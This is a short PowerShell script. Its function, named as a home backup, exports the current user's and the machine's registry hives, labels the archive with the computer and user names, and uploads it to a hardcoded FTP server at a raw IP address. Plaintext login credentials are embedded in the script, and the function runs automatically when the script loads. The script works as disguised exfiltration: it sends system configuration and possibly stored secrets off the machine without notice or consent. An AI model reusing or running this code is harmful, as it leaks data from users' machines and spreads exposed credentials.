
Function Send-BackupHome {
    $ftpServer = "ftp://24.68.245.191"
    $ftpUser = "newloads"
    $ftpPassword = "Jus71nFl@ti0n"
    [String]$currentTimeFTP = Get-Date -Format HH`;mm`;ss
    [String]$currentDateFTP = Get-Date -Format yy.MM.dd
    $localFilePath = ".\$CurrentDateFTP-$CurrentTimeFTP.zip"
    $remoteFilePath = "/$CurrentDateFTP-$CurrentTimeFTP.zip"
    reg export HKCU "HKCU.reg"
    reg export HKLM "HKLM.reg"
    "Registry backup of Computer for user $env:ComputerName\$env:Username" | Out-File ".\$env:computername.txt" ascii
    $array12 = @(
        "HKCU.reg"
        "HKLM.reg"
        "$env:computername.txt"
    )
    Compress-Archive $array12 $localFilePath
    $ftpRequest = [System.Net.FtpWebRequest]::Create("$ftpServer/$remoteFilePath")
    $ftpRequest.Credentials = New-Object System.Net.NetworkCredential($ftpUser, $ftpPassword)
    $ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
    $ftpRequest.UseBinary = $true
    
    # Get the length of the local file for progress tracking
    $fileSize = (Get-Item $localFilePath).Length
    
    # Open local file for reading
    $localFileStream = [System.IO.File]::OpenRead($localFilePath)
    
    try {
        # Open FTP request stream for writing
        $ftpStream = $ftpRequest.GetRequestStream()
        $bufferSize = 8192  # Set the buffer size for transferring data
        $bytesRead = 0  # Initialize the number of bytes read
        # Create a byte array to store the file data
        $buffer = New-Object byte[] $bufferSize
        # Loop through the local file, read data, and write it to the FTP request stream
        while (($bytesRead = $localFileStream.Read($buffer, 0, $bufferSize)) -gt 0) {
            $ftpStream.Write($buffer, 0, $bytesRead)
            # Calculate progress and update the progress bar
            $progress = ($localFileStream.Position / $fileSize) * 100
            Write-Progress -Activity "Uploading file" -Status "Progress" -PercentComplete $progress
            # Display verbose information
            Write-Verbose "Uploaded $bytesRead bytes"
        }
    }
    finally {
        # Close the local file stream and FTP request stream
        if ($localFileStream) {
            $localFileStream.Dispose()
        }
        if ($ftpStream) {
            $ftpStream.Dispose()
        }
    }
    $ftpResponse = $ftpRequest.GetResponse()
    $ftpResponse.Close()
    # Clear the progress bar
    Write-Progress -Activity "Uploading file" -Completed
}

Send-BackupHome